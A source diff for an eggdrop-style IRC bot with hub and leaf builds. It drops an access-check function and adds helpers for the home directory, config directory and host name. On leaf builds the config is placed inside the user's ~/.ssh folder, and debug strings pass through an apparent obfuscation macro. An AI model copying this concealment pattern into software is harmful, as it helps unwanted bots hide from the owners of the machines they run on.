@@ -37,10 +37,10 @@ extern tand_t 		*tandbot;
 
 extern char		 version[], origbotname[], botname[],
 			 admin[], network[], motdfile[], ver[], botnetnick[],
-			 bannerfile[], textdir[], userfile[], dcc_prefix[],
+			 userfile[], dcc_prefix[],
                          *binname, pid_file[], tempdir[], *owneremail;
 
-extern int		 backgrd, con_chan, term_z, use_stderr, dcc_total, timesync,  
+extern int		 backgrd, term_z, use_stderr, dcc_total, timesync,  
 #ifdef HUB
                          my_port,
 #endif
@@ -639,7 +639,7 @@ void putlog EGG_VARARGS_DEF(int, arg1)
 	  (!rfc_casecmp(chname, dcc[i].u.chat->con_chan)))
 	dprintf(i, "%s", out);
     }
-  if ((!backgrd) && (!con_chan) && (!term_z))
+  if ((!backgrd) && (!term_z))
     dprintf(DP_STDOUT, "%s", out);
   else if ((type & LOG_MISC) && use_stderr) {
     if (shtime)
@@ -2287,18 +2287,68 @@ void baduname(char *conf, char *my_uname) {
 }
 
 
-int whois_access(struct userrec *user, struct userrec *whois_user) 
+char *homedir()
 {
-  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
-  struct flag_record whois = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
- 
-  get_user_flagrec(user, &fr, NULL);
-  get_user_flagrec(whois_user, &whois, NULL);
+  static char homedir[DIRMAX] = "";
+  if (!homedir || (homedir && !homedir[0])) {
+    char tmp[DIRMAX];
+    struct passwd *pw;
+    sdprintf(STR("If the bot dies after this, try compiling on Debian."));
+    Context;
+    pw = getpwuid(geteuid());
+    sdprintf(STR("End Debian suggestion."));
 
-  if ((glob_master(whois) && !glob_master(fr)) ||
-     (glob_owner(whois) && !glob_owner(fr)) ||
-     (glob_admin(whois) && !glob_admin(fr)) ||
-     (glob_bot(whois) && !glob_master(fr)))
-    return 0;
-  return 1;
+    if (!pw)
+     werr(ERR_PASSWD);
+    Context;
+    egg_snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
+    Context;
+    realpath(tmp, homedir); /* this will convert lame home dirs of /home/blah->/usr/home/blah */
+  }
+  return homedir;
 }
+
+char *confdir()
+{
+  static char confdir[DIRMAX] = "";
+  if (!confdir || (confdir && !confdir[0])) {
+#ifdef LEAF
+    {
+      egg_snprintf(confdir, sizeof confdir, "%s/.ssh", homedir());
+    }
+#endif /* LEAF */
+#ifdef HUB
+    {
+      char *buf = nmalloc(strlen(binname) + 1);
+      strcpy(buf, binname);
+      egg_snprintf(confdir, sizeof confdir, "%s", dirname(buf));
+      nfree(buf);
+    }
+#endif /* HUB */
+  }
+  return confdir;
+}
+
+char *my_uname()
+{
+  static char os_uname[250] = "";
+  if (!os_uname || (os_uname && !os_uname[0])) {
+    char *unix_n, *vers_n;
+    struct utsname un;
+
+    if (uname(&un) < 0) {
+      unix_n = "*unkown*";
+      vers_n = "";
+    } else {
+      unix_n = un.nodename;
+#ifdef __FreeBSD__
+      vers_n = un.release;
+#else /* __linux__ */
+      vers_n = un.version;
+#endif /* __FreeBSD__ */
+    }
+    egg_snprintf(os_uname, sizeof os_uname, "%s %s", unix_n, vers_n);
+  }
+  return os_uname;
+}
+
